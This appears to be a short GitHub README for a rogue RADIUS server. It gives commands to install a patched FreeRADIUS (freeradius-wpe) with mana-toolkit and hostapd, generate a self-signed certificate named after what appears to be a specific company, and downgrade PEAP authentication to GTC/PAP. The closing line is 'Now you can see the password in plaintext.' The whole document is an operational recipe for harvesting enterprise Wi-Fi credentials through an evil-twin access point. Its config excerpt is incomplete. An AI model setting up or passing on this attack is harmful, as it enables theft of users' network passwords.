# Rogue_Radius_Server
Rogue Radius Server (freeradius patch + hostapd). 

# 1. Install freeradius with patch
How to: https://github.com/brad-anton/freeradius-wpe
# 2. Create hostapd.conf - I use mana-tooklit (Kali linux)
apt-get install mana-toolkit hostapd
# 3. Script for start
start.sh
# Generate certificate and key
sudo openssl genrsa -out "/etc/[webserver]/ssl/private.key" 2048
sudo openssl req -new -key "/etc/[webserver]/ssl/private.key" -out "/etc/[webserver]/ssl/epam.csr"
sudo openssl x509 -req -days 365 -in "/etc/[webserver]/ssl/epam.csr" -signkey "/etc/[webserver]/ssl/private.key" -out "/etc/[webserver]/ssl/epam.crt"

# after that edit eap.conf in /usr/local/etc/raddb:

in eap { 
			default_eap_type = peap
gtc {
			auth_type = PAP
peap {
			default_eap_type = gtc
tls {			path to the certificates
}

# 4. Save and run: radiusd -X
# 5. After that run: hostapd  hostapd-mana-eaponly.conf

# logs: usr/local/var/log/radius# leafpad freeradius-server-wpe.log

Now you can see the password in plaintext
